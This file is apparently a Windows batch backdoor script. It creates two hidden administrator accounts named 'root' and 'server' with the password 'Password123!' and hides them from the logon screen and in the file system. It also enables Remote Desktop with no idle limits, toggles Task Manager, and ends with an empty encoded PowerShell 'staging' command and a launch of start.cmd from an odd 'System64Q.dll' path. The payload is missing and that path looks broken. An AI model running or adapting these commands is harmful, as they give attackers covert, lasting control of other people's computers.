:: Disable guest user account
net user Guest /active:no
:: Modify account policy
net accounts /forcelogoff:no /maxpwage:unlimited
:: Create root user account
net user root Password123! /add /active:"yes" /expires:"never" /passwordchg:"NO"
net localgroup Administrators root /add
net localgroup "Remote Desktop Users" root /add
:: Create server user account
net user server Password123! /add /active:"yes" /expires:"never" /passwordchg:"NO"
net localgroup Administrators server /add
net localgroup "Remote Desktop Users" server /add
:: Change File System Permissions to Hide Accounts
attrib  C:\users\root +r +a +s +h
attrib  C:\users\server +r +a +s +h
:: Hide Accounts from Logon Screen
REG ADD "HKLM\software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v root /t REG_DWORD /d 0x0 /f
REG ADD "HKLM\software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v server /t REG_DWORD /d 0x0 /f
:: Modify Terminal Services Configurations
reg add "HKLM\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
reg add "HKLM\system\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x0 /f
reg add "HKLM\system\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v "MaxIdleTime" /t REG_DWORD /d 0x0 /f
reg add "HKLM\system\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v "MaxDisconnectionTime" /t REG_DWORD /d 0x0 /f
reg add "HKLM\system\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v "MaxConnectionTime" /t REG_DWORD /d 0x1 /f
:: Disable Task Manager
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v disabletaskmgr /t REG_DWORD /d 1 /f
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v disabletaskmgr /t REG_DWORD /d 0 /f
:: Download additional staging
powershell.exe -EncodedCommand 
:: Execute start.cmd
START C:\Windows\System64Q.dll\start.cmd
